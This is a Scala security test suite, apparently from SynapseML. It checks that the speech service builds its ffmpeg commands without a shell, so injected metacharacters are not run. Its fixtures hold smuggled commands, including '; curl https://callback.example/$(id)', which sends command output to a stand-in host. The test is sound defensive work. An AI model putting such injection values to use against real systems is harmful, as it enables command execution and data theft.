// Copyright (C) Microsoft Corporation. All rights reserved.
// Licensed under the MIT License. See LICENSE in project root for information.

package com.microsoft.azure.synapse.ml.services.speech

import com.microsoft.azure.synapse.ml.core.test.base.TestBase

class SpeechToTextSDKSecuritySuite extends TestBase {

  private val uriWithShellMetacharacters =
    "https://example.com/audio.m3u8; touch /tmp/uri-owned"
  private val recordedFileNameWithShellMetacharacters =
    "/tmp/out.mp3; curl https://callback.example/$(id) #"
  private val extraFfmpegArgs = Seq("-t", "2.5")

  test("recorded file names are passed to ffmpeg without a shell") {
    val command = SpeechSDKBase.makeFfmpegCommand(
      uriWithShellMetacharacters,
      extraFfmpegArgs,
      Some(recordedFileNameWithShellMetacharacters))

    assert(command.head == "ffmpeg")
    assert(!command.contains("/bin/sh"))
    assert(!command.contains("-c"))
    assert(!command.contains("|"))
    assert(!command.contains("tee"))
    assert(command.last == recordedFileNameWithShellMetacharacters)
    assert(command.count(_ == recordedFileNameWithShellMetacharacters) == 1)
    assert(command.forall(arg =>
      arg == recordedFileNameWithShellMetacharacters || !arg.contains(recordedFileNameWithShellMetacharacters)))
    assert(command.contains(uriWithShellMetacharacters))
    assert(command.count(_ == uriWithShellMetacharacters) == 1)
    assert(command.sliding(extraFfmpegArgs.length).count(_ == extraFfmpegArgs) == 2)
  }

  test("ffmpeg command omits recorded output when audio recording is disabled") {
    val command = SpeechSDKBase.makeFfmpegCommand(
      uriWithShellMetacharacters,
      extraFfmpegArgs,
      None)

    assert(command.head == "ffmpeg")
    assert(command.last == "pipe:1")
    assert(!command.contains("/bin/sh"))
    assert(!command.contains("|"))
    assert(!command.contains("tee"))
    assert(!command.contains(recordedFileNameWithShellMetacharacters))
    assert(command.sliding(extraFfmpegArgs.length).count(_ == extraFfmpegArgs) == 1)
  }

  test("recorded file names must be non-empty") {
    intercept[IllegalArgumentException] {
      SpeechSDKBase.makeFfmpegCommand(uriWithShellMetacharacters, Seq(), Some(""))
    }
    intercept[IllegalArgumentException] {
      val missingProperty = System.getProperty("synapseml.speech.recordedFileName.missing")
      SpeechSDKBase.makeFfmpegCommand(uriWithShellMetacharacters, Seq(), Some(missingProperty))
    }
  }
}
